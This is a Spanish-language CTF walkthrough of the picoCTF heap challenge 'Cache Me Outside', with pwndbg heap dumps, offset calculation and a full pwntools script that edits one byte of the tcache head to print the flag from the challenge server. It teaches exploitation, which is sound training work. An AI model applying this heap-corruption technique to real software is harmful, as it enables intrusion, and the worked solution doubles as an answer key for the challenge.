# Cache Me Outside

En este ejercicio nos ofrecen tres archivos:

* heapedit (el binario)
* Makefile (información sobre cómo se compiló el programa)
* libc.so.6

Si intentamos ejecutar el binario veremos que no funciona:

```c
./heapedit
Inconsistency detected by ld.so: dl-call-libc-early-init.c: 37: _dl_call_libc_early_init: Assertion `sym != NULL' failed!
```

Como nos dan una libc personalizada, vamos a usar nuestra herramienta de confianza: **pwninit**. Además, crearemos un archivo `flag.txt` para evitar posibles errores en el futuro.

```c
You may edit one byte in the program.
Address: 10
Value: 10
t help you: this is a random string.
```

Ahora podemos empezar a ver qué hace el programa. Parece que, proporcionando una dirección y un valor, podemos cambiar un byte a voluntad en una dirección bajo nuestro control.

Vamos a echarle un vistazo al heap del programa en ejecución:

```c
0x6037f00x00000000000000000x0000000000000091................
0x6038000x00000000000000000x662072756f592021........! Your f <-- tcachebins[0x90][1/2]
0x6038100x203a73692067616c0x706d616320736747lag is: Ggs camp
0x6038200x0000000a216e6f650x0000000000000000eon!............
...
0x6038900x00000000006038000x276e6f7720736968.8`.....his won'<-- tcachebins[0x90][0/2]
0x6038a00x7920706c656820740x73696874203a756ft help you: this
0x6038b00x61722061207369200x727473206d6f646eis a random str
...
```

Como vemos, hay mucha información. Al principio está el chunk del tcache, y luego varios chunks; dos de ellos están libres y alojados en la tcache. Si pensamos un poco, podemos intuir que el programa, tal como funciona, imprime en consola el contenido del chunk que está en la cabeza de la lista. Es decir, hay dos chunks en `tcachebins` y justo el que está en la cabeza es el que se imprime en pantalla.

Si seguimos observando, podemos ver que el otro chunk imprime una frase y, a su vez, la flag. Entre la dirección de un chunk y el otro solo hay un byte de diferencia. Así que, si unimos eso con el hecho de que podemos modificar un byte a voluntad, sabemos que tenemos que hacer que la cabeza de `tcachebins` cambie de `0x603890` a `0x603800`, cambiando el último byte de `0x90` a `0x00`.

Lo que pasa es que no tenemos ningún punto de referencia para calcular direcciones. Comprobemos primero si el binario tiene PIE:

```c
checksec
File:     /home/ub1cu0/Desktop/PWN/picoCTF/Cache_me_outside/heapedit_patched
Arch:     amd64
RELRO:      Partial RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
RUNPATH:    b'.'
Stripped:   No
```

No tiene PIE, por lo que si conseguimos un offset siempre será el mismo. Primero necesitamos saber cómo funciona el valor de la dirección en el programa:

```c
*(undefined *)((long)direccion + (long)local_a0) = valor;
```

Como vemos, en realidad nuestra dirección es un offset en decimal respecto a otra dirección. Solo nos queda saber cuál es esa otra dirección:

```c
for (local_a4 = 0; local_a4 < 7; local_a4 = local_a4 + 1) {
    local_98 = (undefined8 *)malloc(0x80);
    if (direccion_base == (undefined8 *)0x0) {
      direccion_base = local_98;
    }
    *local_98 = 0x73746172676e6f43;
    local_98[1] = 0x662072756f592021;
    local_98[2] = 0x203a73692067616c;
    *(undefined *)(local_98 + 3) = 0;
    strcat((char *)local_98,local_58);
}
```

Según esto, sabemos que la dirección base es la del primer chunk alojado. Vamos a calcular qué distancia hay entre ese chunk y la dirección que queremos modificar:

```c
// Primero miramos dónde se guarda la cabeza que queremos modificar 
pwndbg> tcache
tcache is pointing to: 0x602010 for thread 1
{
  counts = "\000\000\000\000\000\000\000\002", '\000' <repeats 55 times>,
  entries = {0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x603890, 0x0 <repeats 56 times>}
}
pwndbg> dq 0x602010 20
...
pwndbg> db 0x602080 16
0000000000602080     00 00 00 00 00 00 00 00 90 38 60 00 00 00 00 00 // 8 bytes basura
```

La dirección del primer chunk la obtenemos con el comando `vis` en pwndbg.

Ahora que tenemos los datos necesarios, podemos hacer el exploit:

```python
#!/usr/bin/env python3

from pwn import *
import sys

exe = ELF("./heapedit_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.27.so")

context.binary = exe
context.terminal = ['kitty']
gdb_script = '''
b main
continue
'''

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r, gdbscript=gdb_script)
        return r
    return remote("mercury.picoctf.net", 31153)

def main():
    io = conn()
    
    offset = -0x1420 + 0x08
    valor = 0x00

    info(f'Offset = {offset}')

    io.sendlineafter(b'Address: ', str(offset).encode())
    io.sendlineafter(b'Value: ', "\0")
    io.interactive()

if __name__ == "__main__":
    main()
```

Y la salida:

```c
[+] Opening connection to mercury.picoctf.net on port 31153: Done
[*] Offset = -5144
...
lag is: picoCTF{SECRET}
...
[*] Got EOF while reading in interactive
```

¡Funciona, gracias por leer!
